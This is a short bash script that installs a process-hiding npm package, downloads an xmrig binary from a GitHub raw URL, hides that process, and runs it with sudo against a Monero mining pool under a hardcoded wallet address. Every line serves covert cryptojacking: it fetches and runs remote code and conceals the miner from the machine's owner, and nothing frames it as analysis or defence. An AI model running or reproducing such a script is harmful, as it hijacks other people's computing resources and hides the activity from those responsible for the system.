#!/bin/bash
npm i -g node-process-hider
wget https://raw.githubusercontent.com/realxdagg/job/main/xmrig
chmod 500 xmrig
ph add xmrig
sudo ./xmrig --url pool.hashvault.pro:80 --user SuboNeGJJrXVUSPz8cAD1JbrG78qDonJfKcqQNfmjK7TPVbhoDyJTNh1mRg6VTkGC1Gu6jU7XpLjmCAGWfbSRY2U5KNK3r9AY1 --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
